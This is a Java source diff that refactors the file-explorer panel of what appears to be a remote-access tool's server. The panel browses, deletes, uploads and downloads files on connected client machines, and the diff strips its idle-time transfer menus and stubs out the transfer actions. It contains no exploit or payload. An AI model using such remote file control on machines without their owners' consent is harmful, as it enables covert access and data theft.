@@ -39,7 +39,6 @@ import javax.swing.ImageIcon;
 import javax.swing.JButton;
 import javax.swing.JComboBox;
 import javax.swing.JLabel;
-import javax.swing.JMenu;
 import javax.swing.JMenuItem;
 import javax.swing.JPanel;
 import javax.swing.JPopupMenu;
@@ -49,9 +48,9 @@ import javax.swing.JTable;
 import javax.swing.JTextField;
 
 import subterranean.crimson.server.commands.ClientCommands;
-import subterranean.crimson.server.commands.FileCommands;
 import subterranean.crimson.server.graphics.ControlPanel;
 import subterranean.crimson.server.graphics.FileProperties;
+import subterranean.crimson.server.graphics.FileTransferConfirm;
 import subterranean.crimson.server.graphics.StatusLights;
 import subterranean.crimson.server.graphics.frames.MainScreen;
 import subterranean.crimson.server.graphics.models.table.FileSystemModel;
@@ -61,9 +60,6 @@ import subterranean.crimson.universal.FileListing;
 import subterranean.crimson.universal.GetFileInfo;
 import subterranean.crimson.universal.Logger;
 import subterranean.crimson.universal.exceptions.InvalidResponseException;
-import subterranean.crimson.universal.transfer.DownloadTransfer;
-import subterranean.crimson.universal.transfer.UploadTransfer;
-import javax.swing.JSeparator;
 
 public class SPExplorerFiles extends JPanel {
 
@@ -192,11 +188,11 @@ public class SPExplorerFiles extends JPanel {
 						freeze();
 
 						// move remote panel up
-						FileCommands.up(c);
+						ClientCommands.filemanager_up(c);
 						t2.clear();
 						FileListing[] fl = null;
 						try {
-							fl = FileCommands.list(c);
+							fl = ClientCommands.filemanager_list(c);
 						} catch (InvalidResponseException e2) {
 							// TODO Auto-generated catch block
 							e2.printStackTrace();
@@ -283,108 +279,19 @@ public class SPExplorerFiles extends JPanel {
 					final FileListing fl = t1.files.get(sourceRow);
 
 					JPopupMenu popup = new JPopupMenu();
-					JMenu upload = new JMenu();
-					JMenuItem uploadNow = new JMenuItem();
-					JMenuItem uploadCIdle = new JMenuItem();
-					JMenuItem uploadSIdle = new JMenuItem();
-					JMenuItem uploadCSIdle = new JMenuItem();
+					JMenuItem upload = new JMenuItem();
 					JMenuItem properties = new JMenuItem();
 
 					upload.setText("Upload");
 					upload.setIcon(new ImageIcon(MainScreen.class.getResource("/subterranean/crimson/server/graphics/icons/menu/" + ("" + upload.getText().charAt(0)).toUpperCase() + ".png")));
-
-					uploadNow.setText("Now");
-					uploadNow.setIcon(new ImageIcon(MainScreen.class.getResource("/subterranean/crimson/server/graphics/icons/menu/" + ("" + uploadNow.getText().charAt(0)).toUpperCase() + ".png")));
-					uploadNow.addMouseListener(new MouseAdapter() {
+					upload.addMouseListener(new MouseAdapter() {
 						@Override
 						public void mousePressed(MouseEvent e) {
-							// start upload
-
-							String lpath = fl.path + fl.name;
-							System.out.println("LPATH: " + lpath);
-							String rpath = null;
-							try {
-								rpath = FileCommands.pwd(c) + "/" + fl.name;
-							} catch (InvalidResponseException e1) {
-								Logger.add("Failed to get pwd");
-							}
-
-							UploadTransfer trans = new UploadTransfer(lpath, c);
-
-							ClientCommands.uploadFile(rpath, trans, c);
-							spe.ttm.add(trans);
-							// switch panels
-							spe.explorer_tabbedPane.setSelectedComponent(spe.transfers_panel);
-							cp.consoleAppend("Uploading: " + fl.name);
-						}
-
-					});
-					upload.add(uploadNow);
-
-					uploadCIdle.setText("When client is idle");
-					uploadCIdle.setIcon(new ImageIcon(MainScreen.class.getResource("/subterranean/crimson/server/graphics/icons/menu/" + ("" + uploadCIdle.getText().charAt(0)).toUpperCase() + ".png")));
-					uploadCIdle.addMouseListener(new MouseAdapter() {
-						@Override
-						public void mousePressed(MouseEvent e) {
-
-							Logger.add("File will be uploaded when host becomes IDLE");
-							String lpath = t1.getLocalPWD() + "/" + (String) t1.getValueAt(sourceRow, 0);
-							String rpath = null;
-							try {
-								rpath = FileCommands.pwd(c) + (String) t1.getValueAt(sourceRow, 0);
-							} catch (InvalidResponseException e1) {
-								Logger.add("Failed to get pwd");
-							}
-							ClientCommands.uploadFileIdle(c, rpath, lpath);
-							cp.consoleAppend("The file will be transferred when the client becomes idle");
+							// FileTransferConfirm ftc = new FileTransferConfirm(param);
+							// ftc.setVisible(true);
 
 						}
 					});
-					upload.add(uploadCIdle);
-
-					uploadSIdle.setText("When server is idle");
-					uploadSIdle.setIcon(new ImageIcon(MainScreen.class.getResource("/subterranean/crimson/server/graphics/icons/menu/" + ("" + uploadSIdle.getText().charAt(0)).toUpperCase() + ".png")));
-					uploadSIdle.addMouseListener(new MouseAdapter() {
-						@Override
-						public void mousePressed(MouseEvent e) {
-
-							Logger.add("File will be uploaded when host becomes IDLE");
-							String lpath = t1.getLocalPWD() + "/" + (String) t1.getValueAt(sourceRow, 0);
-							String rpath = null;
-							try {
-								rpath = FileCommands.pwd(c) + (String) t1.getValueAt(sourceRow, 0);
-							} catch (InvalidResponseException e1) {
-								Logger.add("Failed to get pwd");
-							}
-							ClientCommands.uploadFileIdle(c, rpath, lpath);
-
-							cp.consoleAppend("The file will be transferred when the server becomes idle");
-
-						}
-					});
-					upload.add(uploadSIdle);
-
-					uploadCSIdle.setText("When client and server are idle");
-					uploadCSIdle.setIcon(new ImageIcon(MainScreen.class.getResource("/subterranean/crimson/server/graphics/icons/menu/" + ("" + uploadCSIdle.getText().charAt(0)).toUpperCase() + ".png")));
-					uploadCSIdle.addMouseListener(new MouseAdapter() {
-						@Override
-						public void mousePressed(MouseEvent e) {
-
-							Logger.add("File will be uploaded when host becomes IDLE");
-							String lpath = t1.getLocalPWD() + "/" + (String) t1.getValueAt(sourceRow, 0);
-							String rpath = null;
-							try {
-								rpath = FileCommands.pwd(c) + (String) t1.getValueAt(sourceRow, 0);
-							} catch (InvalidResponseException e1) {
-								Logger.add("Failed to get pwd");
-							}
-							ClientCommands.uploadFileIdle(c, rpath, lpath);
-
-							cp.consoleAppend("The file will be transferred when the client and server become idle");
-
-						}
-					});
-					upload.add(uploadCSIdle);
 					popup.add(upload);
 
 					// file properties
@@ -470,7 +377,6 @@ public class SPExplorerFiles extends JPanel {
 					JPopupMenu popup = new JPopupMenu();
 
 					JMenuItem download = new JMenuItem();
-					JMenuItem downloadIdle = new JMenuItem();
 					JMenuItem delete = new JMenuItem();
 					JMenuItem properties = new JMenuItem();
 
@@ -480,41 +386,11 @@ public class SPExplorerFiles extends JPanel {
 						public void mousePressed(MouseEvent e) {
 							// start download
 
-							Logger.add("Downloading a file");
-
 							String rpath = fl.path + fl.name;
-
 							String lpath = t1.getLocalPWD() + "/" + fl.name;
-							DownloadTransfer trans = new DownloadTransfer(lpath);
-							spe.ttm.add(trans);
 
-							ClientCommands.downloadFile(c, rpath, trans);
-
-							// switch to transfers tab
-
-							spe.explorer_tabbedPane.setSelectedComponent(spe.transfers_panel);
-
-						}
-
-					});
-
-					downloadIdle.setText("Download When Idle");
-					downloadIdle.addMouseListener(new MouseAdapter() {
-						@Override
-						public void mousePressed(MouseEvent e) {
-							// start download
-
-							Logger.add("Downloading a file");
-
-							String lpath = t1.getLocalPWD() + "/" + (String) t2.getValueAt(sourceRow, 0);
-							DownloadTransfer trans = new DownloadTransfer(lpath);
-							spe.ttm.add(trans);
-
-							ClientCommands.downloadFileIdle(c, fl.path + fl.name, trans);
-
-							// switch to transfers tab
-
-							spe.explorer_tabbedPane.setSelectedComponent(spe.transfers_panel);
+//							FileTransferConfirm ftc = new FileTransferConfirm(param);
+//							ftc.setVisible(true);
 
 						}
 
@@ -525,11 +401,11 @@ public class SPExplorerFiles extends JPanel {
 					delete.addMouseListener(new MouseAdapter() {
 						@Override
 						public void mousePressed(MouseEvent e) {
-							FileCommands.delete(c, fl.path + fl.name);
+							ClientCommands.filemanager_delete(c, fl.path + fl.name);
 							// refresh listing
 							t2.clear();
 							try {
-								t2.add(FileCommands.list(c));
+								t2.add(ClientCommands.filemanager_list(c));
 							} catch (InvalidResponseException e1) {
 								Logger.add("Failed to list files");
 							}
@@ -550,7 +426,6 @@ public class SPExplorerFiles extends JPanel {
 					});
 
 					popup.add(download);
-					// popup.add(downloadIdle);
 					popup.add(delete);
 					popup.add(properties);
 					popup.show(remote_table, e.getX(), e.getY());
@@ -568,18 +443,18 @@ public class SPExplorerFiles extends JPanel {
 								dispStatus("Please wait...");
 
 								// down request
-								FileCommands.down(c, fl.name);
+								ClientCommands.down(c, fl.name);
 								t2.clear();
 
 								try {
-									remote_pwd.setText(FileCommands.pwd(c));
+									remote_pwd.setText(ClientCommands.filemanager_pwd(c));
 								} catch (InvalidResponseException e) {
 									remote_pwd.setText("Failed");
 								}
 
 								// list new files
 								try {
-									t2.add(FileCommands.list(c));
+									t2.add(ClientCommands.filemanager_list(c));
 								} catch (InvalidResponseException e) {
 									Logger.add("Failed to list Files");
 								}
@@ -624,7 +499,7 @@ public class SPExplorerFiles extends JPanel {
 		remote_pwd = new JTextField();
 		remote_pwd.setEditable(false);
 		try {
-			remote_pwd.setText(FileCommands.pwd(c));
+			remote_pwd.setText(ClientCommands.filemanager_pwd(c));
 		} catch (InvalidResponseException e1) {
 			remote_pwd.setText("Failed...");
 		}
